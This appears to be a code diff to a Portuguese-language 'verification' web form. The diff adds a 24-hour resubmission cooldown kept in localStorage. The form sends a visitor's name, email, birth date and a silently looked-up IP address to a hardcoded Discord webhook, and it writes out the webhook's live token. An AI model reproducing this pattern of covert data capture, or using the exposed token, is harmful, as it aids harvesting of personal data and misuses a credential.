@@ -62,7 +62,19 @@
             background-color: #45a049;
         }
         
-        .verification-screen, .error-screen {
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .verification-screen, .error-screen, .waiting-screen {
             display: none;
             position: fixed;
             top: 0;
@@ -106,6 +118,11 @@
             font-style: italic;
             color: #666;
         }
+        
+        .time-remaining {
+            color: red;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
@@ -120,6 +137,7 @@
             <div class="form-group">
                 <label for="email">Email:</label>
                 <input type="email" id="email" name="email" required>
+                <div class="error-message" id="emailError">Esse email já foi registrado hoje. Tente novamente em <span class="time-remaining" id="timeRemaining"></span>.</div>
             </div>
             
             <div class="form-group">
@@ -142,9 +160,83 @@
         <button class="continue-button" onclick="location.reload()">OK</button>
     </div>
 
+    <div class="waiting-screen" id="waitingScreen">
+        <p class="message">Ainda falta <span class="time-remaining" id="globalTimeRemaining"></span> para você poder enviar novamente.</p>
+        <button class="continue-button" onclick="location.reload()">OK</button>
+    </div>
+
     <script>
+        // Armazenamento local para registrar emails e horários
+        const submittedEmails = JSON.parse(localStorage.getItem('formSubmissions')) || {};
+        
+        // Função para formatar o tempo restante
+        function formatTimeRemaining(ms) {
+            const hours = Math.floor(ms / (1000 * 60 * 60));
+            const minutes = Math.floor((ms % (1000 * 60 * 60)) / (1000 * 60));
+            return `${hours}h ${minutes}m`;
+        }
+        
+        // Verificar se o email atual está em cooldown
+        function checkEmailCooldown(email) {
+            if (!submittedEmails[email]) return false;
+            
+            const now = new Date();
+            const lastSubmission = new Date(submittedEmails[email]);
+            const cooldownEnd = new Date(lastSubmission.getTime() + 24 * 60 * 60 * 1000);
+            
+            if (now < cooldownEnd) {
+                return cooldownEnd - now; // Retorna o tempo restante em ms
+            }
+            
+            return false;
+        }
+        
+        // Atualizar o formulário quando a página carrega
+        document.addEventListener('DOMContentLoaded', function() {
+            const emailInput = document.getElementById('email');
+            const emailError = document.getElementById('emailError');
+            
+            emailInput.addEventListener('blur', function() {
+                const email = this.value.trim();
+                if (!email) return;
+                
+                const timeRemaining = checkEmailCooldown(email);
+                if (timeRemaining) {
+                    emailError.style.display = 'block';
+                    document.getElementById('timeRemaining').textContent = formatTimeRemaining(timeRemaining);
+                    document.getElementById('submitBtn').disabled = true;
+                } else {
+                    emailError.style.display = 'none';
+                    document.getElementById('submitBtn').disabled = false;
+                }
+            });
+            
+            // Verificar se há um email em cooldown global
+            const lastSubmission = localStorage.getItem('lastFormSubmission');
+            if (lastSubmission) {
+                const now = new Date();
+                const lastDate = new Date(lastSubmission);
+                const cooldownEnd = new Date(lastDate.getTime() + 24 * 60 * 60 * 1000);
+                
+                if (now < cooldownEnd) {
+                    document.getElementById('formContainer').style.display = 'none';
+                    document.getElementById('waitingScreen').style.display = 'flex';
+                    document.getElementById('globalTimeRemaining').textContent = 
+                        formatTimeRemaining(cooldownEnd - now);
+                }
+            }
+        });
+        
         document.getElementById('verificationForm').addEventListener('submit', async function(e) {
             e.preventDefault();
+            
+            const email = document.getElementById('email').value.trim();
+            
+            // Verificar cooldown novamente antes de enviar
+            if (checkEmailCooldown(email)) {
+                document.getElementById('emailError').style.display = 'block';
+                return;
+            }
             
             // Mostrar loading
             document.getElementById('submitBtn').style.display = 'none';
@@ -153,13 +245,13 @@
             // Coletar dados do formulário
             const formData = {
                 fullName: document.getElementById('fullName').value,
-                email: document.getElementById('email').value,
+                email: email,
                 birthDate: document.getElementById('birthDate').value || 'Não informado',
                 timestamp: new Date().toLocaleString(),
                 ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip).catch(() => 'Não detectado')
             };
             
-            // Webhook do Discord fornecido
+            // Webhook do Discord
             const webhookURL = 'https://discord.com/api/webhooks/1390729092311158826/OoTfhqLaBBCxEjh3Wl3WC-3RVXuFUwTkoPwEKM53whnNxGsAZrvPdkD1jPVGsU5gS29m';
             
             // Formatar mensagem para o Discord
@@ -190,6 +282,11 @@
                 });
                 
                 if (response.ok) {
+                    // Registrar o envio
+                    submittedEmails[formData.email] = new Date().toISOString();
+                    localStorage.setItem('formSubmissions', JSON.stringify(submittedEmails));
+                    localStorage.setItem('lastFormSubmission', new Date().toISOString());
+                    
                     // Mostrar tela de verificação
                     document.getElementById('formContainer').style.display = 'none';
                     document.getElementById('verificationScreen').style.display = 'flex';
